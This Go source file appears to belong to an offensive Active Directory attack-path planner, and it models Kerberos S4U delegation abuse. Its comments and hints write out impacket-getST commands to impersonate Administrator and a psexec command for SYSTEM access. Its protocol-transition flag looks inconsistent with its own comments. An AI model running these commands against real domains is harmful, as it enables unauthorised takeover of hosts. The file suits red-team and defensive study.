// Package s4u_delegation implements the S4U_DELEGATION capability executor.
//
// Background: this executor exploits two related primitives that both rely
// on the Kerberos S4U2Self/S4U2Proxy protocol transition extensions:
//
//  1. Constrained Delegation (msDS-AllowedToDelegateTo): the source
//     principal can request a service ticket on behalf of any user for
//     a specific SPN on the target. With Protocol Transition enabled
//     (TrustedToAuthForDelegation, T2A4D), this works even without an
//     existing user TGT.
//
//  2. Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOf-
//     OtherIdentity / RBCD): the target trusts the source to act on
//     behalf of arbitrary users for any service running on the target.
//     The source must hold a service account / machine account principal
//     (an SPN) but plain user accounts won't satisfy the protocol.
//
// Both flows are executed via impacket-getST:
//
//	impacket-getST -spn cifs/<target> -impersonate Administrator \
//	   <domain>/<source>:<source-pw>@<dc-ip>
//
// On success the attacker receives a usable TGS for Administrator on the
// target's CIFS service — effectively SYSTEM access.
//
// The reference for this implementation is:
//   - MS-SFU §3.2.5: S4U2Self / S4U2Proxy protocol
//   - impacket examples/getST.py
//   - Elad Shamir, "Wagging the Dog" (RBCD foundations)
package s4u_delegation

import (
	"context"
	"strings"

	"adpack/core"
)

// Executor implements core.CapabilityExecutor for S4U_DELEGATION.
type Executor struct{}

// Capability returns the canonical capability string.
func (e *Executor) Capability() core.Capability {
	return "S4U_DELEGATION"
}

// CanExecute returns true when the edge declares an S4U-eligible
// delegation relationship. Distinguishing constrained from RBCD is
// not necessary at this layer — both consume the same impacket-getST
// invocation and produce the same derived impersonation edge.
func (e *Executor) CanExecute(_ context.Context, edge core.PrivilegeEdge, _ *core.ADState) bool {
	if edge.SourcePrincipal == "" || edge.TargetPrincipal == "" || edge.Domain == "" {
		return false
	}
	right := strings.ToUpper(edge.AccessRight)
	switch {
	case strings.Contains(right, "ALLOWEDTODELEGATE"):
		return true
	case strings.Contains(right, "ALLOWEDTOACT"):
		return true
	case right == "TRUSTED_TO_AUTH_FOR_DELEGATION":
		return true
	}
	// Allow EdgeType-based dispatch for collectors that omit AccessRight.
	return strings.EqualFold(edge.EdgeType, "s4u") ||
		strings.EqualFold(edge.EdgeType, "constrained_delegation") ||
		strings.EqualFold(edge.EdgeType, "rbcd_exploit")
}

// Execute declares the post-exploitation graph state.
//
// Derived edge: source can impersonate Administrator (or any user) on
// the target service. Concretely the attacker holds a TGS that grants
// service-level access; subsequent lateral movement uses that ticket
// via KRB5CCNAME.
func (e *Executor) Execute(_ context.Context, edge core.PrivilegeEdge, _ *core.ADState) core.ExecutionResult {
	variant := "constrained_delegation"
	right := strings.ToUpper(edge.AccessRight)
	if strings.Contains(right, "ALLOWEDTOACT") {
		variant = "rbcd_exploit"
	}

	impersonation := core.PrivilegeEdge{
		SourcePrincipal: edge.SourcePrincipal,
		TargetPrincipal: edge.TargetPrincipal,
		AccessRight:     "ImpersonateAs_Administrator",
		EdgeType:        variant,
		Domain:          edge.Domain,
		Provenance:      "executor",
		Confidence:      0.85,
		Exploitability:  0.9,
		Noise:           0.3, // S4U is significantly quieter than coercion
		Requires:        []string{"impacket-getST", "impacket-secretsdump"},
	}

	// Once we hold a high-priv TGS for the target's CIFS, lateral
	// movement to SYSTEM is a single psexec/wmiexec away — mark that
	// as a derived HasSession edge so the planner sees the chain.
	session := core.PrivilegeEdge{
		SourcePrincipal: edge.SourcePrincipal,
		TargetPrincipal: edge.TargetPrincipal,
		AccessRight:     "HasSession",
		EdgeType:        "kerberos_session",
		Domain:          edge.Domain,
		Provenance:      "executor",
		Confidence:      0.8,
		Exploitability:  0.85,
		Noise:           0.4,
		Requires:        []string{"impacket-psexec", "impacket-wmiexec"},
	}

	identities := []core.IdentityObservation{
		{
			Type: "s4u_impersonation",
			Data: map[string]any{
				"source_principal":    edge.SourcePrincipal,
				"target_principal":    edge.TargetPrincipal,
				"variant":             variant,
				"impersonated":        "Administrator",
				"spn":                 "cifs/" + edge.TargetPrincipal,
				"domain":              edge.Domain,
				"protocol_transition": variant == "rbcd_exploit",
			},
		},
	}

	artifacts := []core.ArtifactObservation{
		{
			Type: "tgs_ccache",
			Data: map[string]any{
				"path_hint":   "/tmp/Administrator@cifs_*.ccache",
				"target_spn":  "cifs/" + edge.TargetPrincipal,
				"action_hint": "export KRB5CCNAME=<path>; impacket-psexec -k <target>",
			},
		},
	}

	return core.ExecutionResult{
		FailureMode: core.FailureSuccess,
		Delta: core.PostStateDelta{
			NewEdges: []core.PrivilegeEdge{impersonation, session},
		},
		Identities: identities,
		Artifacts:  artifacts,
	}
}
